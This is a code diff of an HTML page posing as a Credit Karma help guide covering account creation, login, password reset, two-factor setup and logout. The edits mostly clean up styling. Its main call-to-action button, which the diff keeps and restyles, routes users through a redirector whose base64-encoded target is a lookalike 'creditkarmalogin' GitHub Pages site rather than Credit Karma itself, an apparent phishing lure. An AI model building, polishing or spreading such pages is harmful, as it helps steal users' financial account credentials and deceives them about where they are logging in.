@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -73,15 +72,10 @@
         #banner {
             position: relative;
             width: 100%;
-         
             background-image: url('couple-reviewing-credit-impact.jpg');
-
-
             height: 550px;
             margin-top: 1%;
-            /*opacity:0.7;*/
-            background-color: rgb(79, 111, 82,1.5);
-            
+            background-color: rgba(79, 111, 82, 1.5);
         }
 
         #banner h1 {
@@ -92,19 +86,28 @@
             text-transform: uppercase;
         }
 
-        #banner button {
+        #banner a.button {
             position: absolute;
             top: 80%;
             left: 50%;
             transform: translate(-50%, -50%);
-            -ms-transform: translate(-50%, -50%);
             background-color: #164391;
+            background: linear-gradient(135deg, #1a73e8 0%, #4285f4 100%);
             color: white;
             font-size: 16px;
             padding: 19px 30px;
             border: none;
             cursor: pointer;
             border-radius: 15px;
+            text-decoration: none;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            transition: all 0.3s ease;
+        }
+
+        #banner a.button:hover {
+            background: linear-gradient(135deg, #4285f4 0%, #1a73e8 100%);
+            box-shadow: 0 6px 10px rgba(0, 0, 0, 0.15);
+            transform: translate(-50%, -50%) scale(1.05);
         }
 
         #content-container {
@@ -144,50 +147,40 @@
             opacity: 1;
         }
         
-.additional-content h2{
-    
-                    padding:40px;
-                     text-align: center;
-                     font-size:40px;
-    
-}
+        .additional-content h2 {
+            padding: 40px;
+            text-align: center;
+            font-size: 40px;
+        }
 
-.additional-content p{
-    
-                    padding:2px;
-                     text-align: center;
-                     font-size:18px;
-    
-}
-.additional-contents ul li{
-     
-                  padding:10px;
-                   margin-left:2%;
-                     font-size:18px;
-                     line-height:30px;
+        .additional-content p {
+            padding: 2px;
+            text-align: center;
+            font-size: 18px;
+        }
 
+        .additional-contents ul li {
+            padding: 10px;
+            margin-left: 2%;
+            font-size: 18px;
+            line-height: 30px;
+        }
 
-    
-}
+        .second-additional-content h2 {
+            padding: 40px;
+            text-align: center;
+            font-size: 40px;
+            background-color: #4F6F52;
+            color: white;
+        }
 
-.second-additional-content h2{
-    
-                     padding:40px;
-                     text-align: center;
-                     font-size:40px;
-                     background-color:#4F6F52;
-                     color:white;
-}
-                  
-.second-additional-content p{
-    
-    padding:15px;
-                     text-align: center;
-                     font-size:18px;
-}                     
-    
+        .second-additional-content p {
+            padding: 15px;
+            text-align: center;
+            font-size: 18px;
+        }
 
-     .sholey-container {
+        .sholey-container {
             display: flex;
             align-items: center;
         }
@@ -200,8 +193,8 @@
         .image-container img {
             max-width: 100%;
             height: auto;
-            margin-left:5%;
-            width:80%;
+            margin-left: 5%;
+            width: 80%;
         }
 
         .list-container {
@@ -217,15 +210,11 @@
             margin-bottom: 10px;
             border-bottom: 1px solid #ccc;
             padding-bottom: 10px;
-            line-height:30px;
-            margin-right:8%;
-        }       
+            line-height: 30px;
+            margin-right: 8%;
+        }
 
-
-
-
-
-          .custom-container {
+        .custom-container {
             display: inline-block;
             width: 30%;
             margin: 20px;
@@ -238,7 +227,6 @@
         .r2h h1 {
             margin-bottom: 20px;
         }
-        
     </style>
 </head>
 <body>
@@ -260,10 +248,7 @@
             </div>
             <div id="banner">
                 <h1>Credit Karma - Creating a Credit Karma Account</h1>
-
-  <a href="https://ww0.us/?aHR0cHM6Ly9jcmVkaXRrYXJtYWxvZ2luLmdpdGh1Yi5pby8=" class="button">Let's Get Started</a>
-
-</a>
+                <a href="https://ww0.us/?aHR0cHM6Ly9jcmVkaXRrYXJtYWxvZ2luLmdpdGh1Yi5pby8=" class="button">Let's Get Started</a>
             </div>
         </form>
     </header>
@@ -320,25 +305,15 @@ To register for Credit Karma, go to their website and click "Sign Up." Input you
 
 
 <!-- Add this section after the existing content-container -->
-<div class
-="additional-contents">
+<div class="additional-contents">
     <ul>
-        <li></strong>: Start by going to the Credit Karma website using your web browser.</li>
-        <li></strong>: Look for the "Log In" button, usually located at the top right corner of the homepage.
-</li>
-        <li></strong>:
-      Click on the "Log In" button, and it will take you to the login page.
-</li>
-        <li></strong>: On the login page, enter the email address you used to create your Credit Karma account.
-</li>
-        <li></strong>:
-
-Next, enter the password you set up for your account.Once you've entered your email and password, click on the "Log In" button..</li>
-            <li></strong>: If you've set up two-factor authentication for added security, you might be prompted to enter a code sent to your email or phone number.After completing any additional security steps, you should be logged in to your Credit Karma account.
-
-</li></strong>
+        <li>Start by going to the Credit Karma website using your web browser.</li>
+        <li>Look for the "Log In" button, usually located at the top right corner of the homepage.</li>
+        <li>Click on the "Log In" button, and it will take you to the login page.</li>
+        <li>On the login page, enter the email address you used to create your Credit Karma account.</li>
+        <li>Next, enter the password you set up for your account. Once you've entered your email and password, click on the "Log In" button.</li>
+        <li>If you've set up two-factor authentication for added security, you might be prompted to enter a code sent to your email or phone number. After completing any additional security steps, you should be logged in to your Credit Karma account.</li>
     </ul>
-    
 </div>
    <br>
    <br>
@@ -347,40 +322,18 @@ Next, enter the password you set up for your account.Once you've entered your em
     <!-- Add this section after the existing content-container -->
 <div class="second-additional-content">
     <h2>What do I do if I can't remember my Credit Karma password?</h2>
-    
 </div>
     
-    
-        
 <div class="sholey-container">
     <div class="image-container">
         <img src="image_processing20210909-11397-fn1xlb.gif" alt="Description of the image">
     </div>
     <div class="list-container">
         <ul class="list">
-            <li>
-<strong>Go to the Credit Karma website:</strong>: Navigate to credit karma using your web browser. Click on  Log In Look for the "Log In" button at the top right corner of the homepage and click on it.<br>
-<STRONG>Select "Forgot password?":</STRONG>:On the login page, you'll find a link that says "Forgot password?" or "Need help logging in?" Click on this link.</li><br>
-            <li>
-            <strong>Enter your email address:</strong>:  You'll be directed to a page where you can enter the email address associated with your Credit Karma account. Input your email address and click "Continue" or "Submit."<br>
-<strong>Open the email and click on the password reset link</strong>: Open the email from Credit Karma and click on the password reset link provided in the email.<br>
-<!-- <strong>Wi-Fi Setup</strong>: Choose "Wi-Fi Setup Wizard" to begin the setup process.<br>
-<strong>Select Network</strong>: From the available networks, select your Wi-Fi network.<br>
-<strong>Enter Password</strong>: Input the Wi-Fi password when prompted to establish the connection. -->
-            </li>
-            <li>
-     
-<!-- <strong>Gift Giving</strong>: It's a practical way to give gifts, allowing recipients the flexibility to choose their own purchases. -->
-            </li><br>
-            <li>
-            <strong>Follow the instructions to create a new password:</strong>: You'll be taken to a page where you can create a new password for your Credit Karma account. Follow the instructions to choose a new password and confirm it.<br>
-<!-- <strong>Global Acceptance</strong>: Many Vanilla Gift Cards are accepted worldwide, offering flexibility for international transactions.<br> -->
-<!-- <strong>Complete Setup</strong>: Adhere to the on-screen prompts and instructions to finalize the setup process. -->
-            </li><br>
-            <li>
-            <strong>Log in with your new password: </strong>: Your password should now be updated. You can use your new password to log in to your Credit Karma account.<br>
-               
-            </li>
+            <li><strong>Go to the Credit Karma website:</strong> Navigate to Credit Karma using your web browser. Click on "Log In" Look for the "Log In" button at the top right corner of the homepage and click on it. <br><strong>Select "Forgot password?":</strong> On the login page, you'll find a link that says "Forgot password?" or "Need help logging in?" Click on this link.</li>
+            <li><strong>Enter your email address:</strong> You'll be directed to a page where you can enter the email address associated with your Credit Karma account. Input your email address and click "Continue" or "Submit." <br><strong>Open the email and click on the password reset link:</strong> Open the email from Credit Karma and click on the password reset link provided in the email.</li>
+            <li><strong>Follow the instructions to create a new password:</strong> You'll be taken to a page where you can create a new password for your Credit Karma account. Follow the instructions to choose a new password and confirm it.</li>
+            <li><strong>Log in with your new password:</strong> Your password should now be updated. You can use your new password to log in to your Credit Karma account.</li>
         </ul>
     </div>
 </div>
@@ -388,63 +341,30 @@ Next, enter the password you set up for your account.Once you've entered your em
     <br>
     <br>
     
-
-
-
-
-    
      <div class="content">
-            <center><h2 style="font-size:34px;">How do I add extra security to my Credit Karma login?
-</h2></center><br><br>
-            <center><p>To enhance the security of your Credit Karma login, you can enable two-factor authentication (2FA). After logging into your Credit Karma account, access your account settings, typically found by clicking on your profile icon or name. Within the settings, locate the section related to security or login security. Here, you'll find the option to enable 2FA. Choose your preferred method, such as receiving a code via text message, using an authenticator app, or utilizing a security key. 
-<br><br>
-Follow the prompts to set up your chosen method, which may involve verifying your identity through a code sent to your phone or authenticator app. Once completed, save your changes to activate 2FA on your Credit Karma account. This additional layer of security helps safeguard your account by requiring a second form of verification beyond your password, reducing the risk of unauthorized access.</p></center>
-        </div>
+        <center><h2 style="font-size:34px;">How do I add extra security to my Credit Karma login?</h2></center><br><br>
+        <center><p>To enhance the security of your Credit Karma login, you can enable two-factor authentication (2FA). After logging into your Credit Karma account, access your account settings, typically found by clicking on your profile icon or name. Within the settings, locate the section related to security or login security. Here, you'll find the option to enable 2FA. Choose your preferred method, such as receiving a code via text message, using an authenticator app, or utilizing a security key.</p><p>Follow the prompts to set up your chosen method, which may involve verifying your identity through a code sent to your phone or authenticator app. Once completed, save your changes to activate 2FA on your Credit Karma account. This additional layer of security helps safeguard your account by requiring a second form of verification beyond your password, reducing the risk of unauthorized access.</p></center>
+    </div>
     <br>
    <br>
 <div class="second-additional-content">
     <h2>How do I log out of Credit Karma?</h2>
-    <center><p style="font-size:18px;">To log out of your Credit Karma account, follow these steps:
-
-</p></center>
-    
+    <center><p style="font-size:18px;">To log out of your Credit Karma account, follow these steps:</p></center>
 </div>
     
     <br><br>
         
 <div class="sholey-container">
-
     <div class="list-container">
         <ul class="list">
-            <li><strong>Navigate to the Credit Karma website:</strong><br>
-Open your web browser and go to credit karma.<br>
- </li>
-            <li><strong> Click on your profile icon:</strong><br>
-             Look for your profile icon or name at the top right corner of the page. Click on it to access your account menu.<br>
-<br>
-<!-- <strong>Wi-Fi Setup</strong>: Choose "Wi-Fi Setup Wizard" to begin the setup process.<br>
-<strong>Select Network</strong>: From the available networks, select your Wi-Fi network.<br>
-<strong>Enter Password</strong>: Input the Wi-Fi password when prompted to establish the connection. -->
-            </li>
-            <li><strong>Find the "Log Out" option:</strong>:<br>
-            In the account menu, you should see an option that says "Log Out" or "Sign Out." Click on this option.
-
-            </li>
-            <li><strong>Confirm your log out: </strong>:<br>
-           A confirmation message may appear asking if you're sure you want to log out. If prompted, confirm that you want to log out of your Credit Karma account.<br>
-<!-- <strong>Complete Setup</strong>: Adhere to the on-screen prompts and instructions to finalize the setup process. -->
-            </li>
-            <li><strong>Log out:</strong>:<br>
-          Once confirmed, you will be logged out of your Credit Karma account. You may be redirected to the Credit Karma homepage or to a log-in page.
-.<br>
-
-            </li>
+            <li><strong>Navigate to the Credit Karma website:</strong> Open your web browser and go to Credit Karma.</li>
+            <li><strong>Click on your profile icon:</strong> Look for your profile icon or name at the top right corner of the page. Click on it to access your account menu.</li>
+            <li><strong>Find the "Log Out" option:</strong> In the account menu, you should see an option that says "Log Out" or "Sign Out." Click on this option.</li>
+            <li><strong>Confirm your log out:</strong> A confirmation message may appear asking if you're sure you want to log out. If prompted, confirm that you want to log out of your Credit Karma account.</li>
+            <li><strong>Log out:</strong> Once confirmed, you will be logged out of your Credit Karma account. You may be redirected to the Credit Karma homepage or to a log-in page.</li>
         </ul>
     </div>
 </div>    
     
 </body>
 </html>
->
-
-
